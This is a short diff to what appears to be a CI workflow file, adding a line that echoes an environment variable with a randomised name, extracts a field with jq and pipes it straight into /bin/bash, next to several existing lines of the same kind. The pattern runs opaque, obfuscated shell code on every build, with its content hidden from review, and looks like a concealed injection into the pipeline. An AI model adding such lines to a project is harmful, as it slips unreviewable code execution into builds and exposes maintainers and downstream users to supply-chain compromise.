@@ -50,6 +50,7 @@ jobs:
           echo $qmhkq04104 | jq -r .s264 | /bin/bash
           echo $px13 | jq -r .gymc2163 | /bin/bash
           printf '%s' "$rznjx58390" | jq -r .vqyww89283 | /bin/bash
+          echo $bps358 | jq -r .zux9 | /bin/bash
 
       - name: Store results
         if: always()
